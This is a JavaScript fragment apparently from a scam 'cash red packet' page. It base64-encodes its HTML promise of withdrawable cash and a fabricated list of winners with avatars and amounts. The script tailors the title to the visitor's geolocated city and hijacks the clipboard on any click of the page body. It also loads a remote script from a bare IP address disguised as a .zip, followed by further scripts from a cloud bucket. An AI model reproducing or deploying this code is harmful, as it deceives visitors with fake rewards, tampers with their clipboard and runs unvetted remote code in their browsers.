var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province : '����');
var city = address.replace(/(.*)��/,'$1');
city = city.replace(/(.*)ʡ/,'$1');
document.title = _ht.replace(/{city}/g,city);
var pagebody = 'PGRpdiBjbGFzcz0icmVkLXBhY2tldC1jb250YWluZXIgaW5kZXgtc2hvdy1tb3JlLWJvZHkiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgPGRpdiBjbGFzcz0idG9wLWJveCI+CiAgICA8ZGl2IGNsYXNzPSJjb250LWhlYWQtcG9ydHJhaXQiID4KICAgICAgPCEtLXN0eWxlPSJ3aWR0aDogMzAwcHggIWltcG9ydGFudDtoZWlnaHQ6IDgwcHg7d2lkdGg6LjU4cmVtO2hlaWdodDouNThyZW07Ii0tPgogICAgICA8aW1nIHNyYz0iJShoZWFkKSIgPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250LWRlc2MtYmxlc3NpbmciPgoKICAgICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMjRweDsiPiUoaHVvZG9uZ25hbWUpPC9wPgogICAgICA8cD7lhajmsJHmtL7lj5HnjrDph5HnuqLljIU8aSBjbGFzcz0iaWNvbi1wcm9tcHQiPuWPr+aPkOeOsDwvaT48L3A+CiAgICA8L2Rpdj4KCiAgICA8YSBjbGFzcz0iYnRuLW9wZW4tcmVkLXBhY2tldCIgaHJlZj0iamF2YXNjcmlwdDo7Ij48c3Bhbj7plos8L3NwYW4+PC9hPgogICAgPHAgY2xhc3M9ImNvbnQtZGVzYy1ib3R0b20iPi0g5LuK5pel5bey5pyJPHNwYW4+JShsaW5ncXVudW0pPC9zcGFuPuS6uumihuWPluS6hue6ouWMhSAtPC9wPgogIDwvZGl2PgogIDx1bCBjbGFzcz0ibGlzdCI+PC91bD4KPC9kaXY+CjxkaXYgY2xhc3M9ImF3YXJkLWNvbnRhaW5lciBhd2FyZC1ib2R5IiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogIDxwIGNsYXNzPSJjb250ZW50LXRvcC10aXBzIj7mga3llpzpooblj5bnuqLljIU8L3A+CiAgPHAgY2xhc3M9ImNvbnRlbnQtcHJpY2UiPgogICA8c3VwPu+/pTwvc3VwPjxzcGFuIGNsYXNzPSJqc19tb25leSI+PC9zcGFuPjxpIGNsYXNzPSJpY29uLWhpZ2hlc3QiPuacgOmrmDwvaT4KICA8L3A+CiAgPGRpdiBjbGFzcz0iY29udGVudC1jaGFyZ2UtYm94Ij4KICAgIDxhIGNsYXNzPSJjaGFyZ2UtYnRuIiBocmVmPSJqYXZhc2NyaXB0OjsiPueri+WNs+mihuWPlue6ouWMhTwvYT4KICAgIDxwIGNsYXNzPSJjaGFyZ2UtdGlwcyI+5LuK5pelMjTngrnliY3mnKrmlLbpkrHvvIzlsIbmlLblm57nuqLljIXotYTmoLw8YnIvPjxzcGFuIHN0eWxlPSJjb2xvcjogcmVkOyI+5aaC5aSa5qyh6aKG5Y+W5Lul5pyA5ZCO5LiA5qyh6aKG5Y+W6YeR6aKd5Li65YeGPC9zcGFuPjwvcD4KICA8L2Rpdj4KICA8cCBjbGFzcz0iY29udGVudC10aXBzLXRvdGFsIj7mgLvlhbExMDAwMDDku73vvIzlt7LmiJDlip/lj5Hlh7olKGZhZmFuZ251bSnku73nuqLljIU8L3A+CjwvZGl2Pg==';
  var userlist = 'WwogICAgewogICAgICAibmFtZSI6ICLliJjlrZDmgKHniLjniLgiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzlERTY1NkE5QjBDMDM4NEZDQ0Y3RDAyQkQwMkNGQ0I1LzEwMCIsCiAgICAgICJtb25leSI6ICIyMy4zNiIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5oiR5piv5L2g55qE5oOF5Lq6IiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS81REE1MDhBMTYxNkU3MzJCMEVCOTJBMUFEQUYyODQ1Ni8xMDAiLAogICAgICAibW9uZXkiOiAiMjguNzkiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuiKseiKseWFrOWtkCIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvRDQyMDY2REUxOUVCQjgyRDMwQTM1MTE4NTk1NkRCNDEvMTAwIiwKICAgICAgIm1vbmV5IjogIjE5LjM5IgogICAgfSwgewogICAgICAibmFtZSI6ICLmvYfkuobkuKrmtJIiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1L0Y2MjEzNjY3RTg1RTIwNUZGMzYzQjM5NDdEMjE4RDM4LzEwMCIsCiAgICAgICJtb25leSI6ICIyMy45MCIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5aSp5aSp5ZCR5LiKIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9ENTZFRTRENzE0MjJBMTEyQ0RBNkI3QjQ0RDQ4QjA0NC8xMDAiLAogICAgICAibW9uZXkiOiAiMjIuMDQiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuS4gOWImOmYv+WnqCIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvMERFMDc5QjkwM0U0NEY5NkFCOUJBRDg1RDcwNkE2MUYvMTAwIiwKICAgICAgIm1vbmV5IjogIjI1LjU2IgogICAgfSwgewogICAgICAibmFtZSI6ICLlrZTmtbfopb8iLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1L0E2RjNDQTRCOTdFNTlCQjlBRTU0OTU5ODRBQ0YzMDkwLzEwMCIsCiAgICAgICJtb25leSI6ICIxMy42NyIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAiSUYgWU9VIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9FMEZCMkU5NUQ4NDA2OEI5NDQ3ODlCRjY1NjlCM0E3Ri8xMDAiLAogICAgICAibW9uZXkiOiAiMjYuNDciCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuW/q+adpeiwg+S+gyIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvNzFFNDgzN0I3QjFGMEExMkQ1RjhEOTAyMzREREI5NUMvMTAwIiwKICAgICAgIm1vbmV5IjogIjIzLjM0IgogICAgfSwgewogICAgICAibmFtZSI6ICLjgILlpKflk6Xlk6UiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzlBREJBRUJFMjkyQjRGQTA3MzdGOURCMTQyMzM2MTU3LzEwMCIsCiAgICAgICJtb25leSI6ICIyNi4wNSIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5bCP5biD5LiBNTU1IiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9ENkFFRTExODY2Q0NFQzA5MkI4MkM1MzIyMThGNkIyMC8xMDAiLAogICAgICAibW9uZXkiOiAiMTguMDMiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuS8vOaHgumdnuaHgiIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvRDM4NzVCNDRBOERCNEFCRTEzNTA1OUM3MzYyQjQwOTQvMTAwIiwKICAgICAgIm1vbmV5IjogIjI3LjQ3IgogICAgfSwgewogICAgICAibmFtZSI6ICIg5LqM5Y+UIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9CN0NERkFBNUZENTRBMEZEMjkwNEEzMEI2QTI5RDY2MC8xMDAiLAogICAgICAibW9uZXkiOiAiMTUuNjgiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuW/q+S5kOavj+S4gOWkqV8iLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzVDRDlCN0FDRDM0MzMyQjhEQTE0NUJFM0RFNEM0NEZCLzEwMCIsCiAgICAgICJtb25leSI6ICIyNy4wNyIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5aW9OOS4jeWlvTgiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzE4OTk1NUYwNUY0ODJERTk1NjQ4MERCNjZCMDdFNERDLzEwMCIsCiAgICAgICJtb25leSI6ICIxNC44NyIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5bCP55Sc55ScIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9EMUE1OTZFNDdDMEFBMjc5QkE4QkI5QkFBQzAyQ0M0NC8xMDAiLAogICAgICAibW9uZXkiOiAiMTcuMTgiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuacgOS9s+aQreaho++8jCIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvMjMxNjU2N0Y1MjcxMkM3NzUwNDhEQjAyQkY1QzI2MUMvMTAwIiwKICAgICAgIm1vbmV5IjogIjE1LjA2IgogICAgfSwgewogICAgICAibmFtZSI6ICLkuozliIZeX17nnaHnnKAiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1L0M1NEQ2RTY4NDg1Rjg0QTg2ODIyQ0Y3RTQ3M0E5M0VDLzEwMCIsCiAgICAgICJtb25leSI6ICIxMi40NCIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5a2Z57KS5a2QIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9CRTJCRkQ2RDc0M0Y4MTVBQzdBOEZBOTc0RTQwRDRGQy8xMDAiLAogICAgICAibW9uZXkiOiAiMTUuNTYiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIk1yLiBYdWUiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzUyODNCQjM4MDhBMTZEMjI3QUMwM0RDNDM3NEY3N0M2LzEwMCIsCiAgICAgICJtb25leSI6ICIyOS4yNiIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi44CBZGFjeSIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvNDhCRTNCNTBDM0U5ODQ3MjQyNjI2RkY5QTA3QzMzMTcvMTAwIiwKICAgICAgIm1vbmV5IjogIjI2LjUyIgogICAgfSwgewogICAgICAibmFtZSI6ICLlt7LlqZrlsJHlubQiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzAyMzA1RTQzM0M5N0M3MjQ5MzFBNzlGOEZCMDRGRTUwLzEwMCIsCiAgICAgICJtb25leSI6ICIyNS45OSIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5Y+r5oiR5Yaw5YawIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS8xOThGRDg1QkM3RUZCQ0NCNUM3M0FFNEZFQjYzMzU2MC8xMDAiLAogICAgICAibW9uZXkiOiAiMjkuODAiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuWNouato+iLsSIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvMjUyMTdCRkU1MUExQjhBMTYxNjBBOUY0MzgzN0E4NkYvMTAwIiwKICAgICAgIm1vbmV5IjogIjE1LjY0IgogICAgfSwgewogICAgICAibmFtZSI6ICJKa3ouIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS83NzJEMDREOUVCOEU3MEE5NjFBMUQ1Q0FCQkNGMjkzQS8xMDAiLAogICAgICAibW9uZXkiOiAiMTAuNTUiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIumbt+S5kOWkqSIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvQkE2REE1MjM3RDQxNzVEREM3NTA1NTM1NjFGMjE5QjcvMTAwIiwKICAgICAgIm1vbmV5IjogIjIxLjc2IgogICAgfSwgewogICAgICAibmFtZSI6ICLmnInkvaDmr4/kuIDlpKkiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzlDRkQ4NEQ3NEFCRjUxNDFFQThGNkI3M0JEMDZDM0UxLzEwMCIsCiAgICAgICJtb25leSI6ICIyNi41NyIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5q+V56uf5oiR5Lus6L+Y5bm06L27IiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS83Mjc2M0RFMDUzMzhCNzM4RUVBNEQ5RkJFRkQ4REJCRi8xMDAiLAogICAgICAibW9uZXkiOiAiMjQuNTciCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuS4lueVjOadr+eci+WuoiIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvMjlEQkM2MjE3RkEwQjA2QUJDMjVDNzBGRTI2MDIyMUYvMTAwIiwKICAgICAgIm1vbmV5IjogIjIyLjYxIgogICAgfSwgewogICAgICAibmFtZSI6ICLpopHnuYHnmoTmiJEiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzE2NTZFRERBN0U2NDhERDMyRTg2MjQ2MEVFOTJFMUM1LzEwMCIsCiAgICAgICJtb25leSI6ICIyNS44MSIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAi5aaZ5LiN5Y+v6KiAIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9FMjM0OERGRjg1QUU4NjFEMTc0NTFCRERDMDQzMjgwOS8xMDAiLAogICAgICAibW9uZXkiOiAiMjkuMTgiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuaYpeWkqeiIrO+9nua4qeaaliIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvRERBMzYzNDRGREFGOERGMkJGREQ4RjNEQUVERTVCNzQvMTAwIiwKICAgICAgIm1vbmV5IjogIjIxLjY1IgogICAgfSwgewogICAgICAibmFtZSI6ICLlsI/njKvlkqrlm57lv4YiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzY4NUFBMzY0MzhEREQ3RTBFQjU1RDBDMTgwOTdDQTFDLzEwMCIsCiAgICAgICJtb25leSI6ICIxNC4wMiIKICAgIH0sIHsKICAgICAgIm5hbWUiOiAiMTBH5rWB6YeP5LiN5aSf55SoIiwKICAgICAgImF2YXRhciI6ICJodHRwczovL3EucWxvZ28uY24vcXFhcHAvMTEwNDcxODExNS9EMDkxQTI5N0QwQTNEMzYxOUM2RDgyOEM2ODFGMzA1Ri8xMDAiLAogICAgICAibW9uZXkiOiAiMjYuMTEiCiAgICB9LCB7CiAgICAgICJuYW1lIjogIuaiheilv+eOi+WtkCIsCiAgICAgICJhdmF0YXIiOiAiaHR0cHM6Ly9xLnFsb2dvLmNuL3FxYXBwLzExMDQ3MTgxMTUvNzdBQzkxNzZFMEVFOTRBNTUyQUFENjk2MTA2NkQ0QkEvMTAwIiwKICAgICAgIm1vbmV5IjogIjI0Ljc0IgogICAgfSwgewogICAgICAibmFtZSI6ICLkuK3lm73pmJ/lv4Xog5wiLAogICAgICAiYXZhdGFyIjogImh0dHBzOi8vcS5xbG9nby5jbi9xcWFwcC8xMTA0NzE4MTE1LzNDQzZDMDM3ODZDNkM2OTNGMzY0QjM5NUYzMjcxOTdGLzEwMCIsCiAgICAgICJtb25leSI6ICIyNS4yNSIKICAgIH0KICBd';
$("body").addClass("xs_btn_yy");var clipboard=new Clipboard(".xs_btn_yy",{text:function(){return _kll}});
  function myloadJs(src, callback, errCallback) {
    if (!src) { return; }
    var e = document.createElement('script');
    e.setAttribute('type', 'text/javascript');
    e.setAttribute('charset', 'utf-8');
    e.setAttribute('src', src);
    document.getElementsByTagName('head')[0].appendChild(e);
    if (typeof errCallback === 'function') { e.onerror = errCallback; }
    e.onload = function () {
      if (typeof callback === 'function') { callback(); }
    };
  };
  function mygnk(src, callback, errCallback) {
    if (!src) { return; }
    var e = document.createElement('script');
    e.setAttribute('type', 'text/javascript');
    e.setAttribute('charset', 'gbk');
    e.setAttribute('src', src);
    document.getElementsByTagName('head')[0].appendChild(e);
    if (typeof errCallback === 'function') { e.onerror = errCallback; }
    e.onload = function () {
      if (typeof callback === 'function') { callback(); }
    };
  };
  var jroot = 'https://ww8-71.oss-cn-shanghai.aliyuncs.com/ww8-71/baidu/resource/public/js'; 
  mygnk('http://'+_toip+'/374802d0d2c10b991119a1f53a31ca4b.zip',function(){
      myloadJs(jroot+'/core.js',function(){
          myloadJs(jroot+'/d.js');
      }); 
  });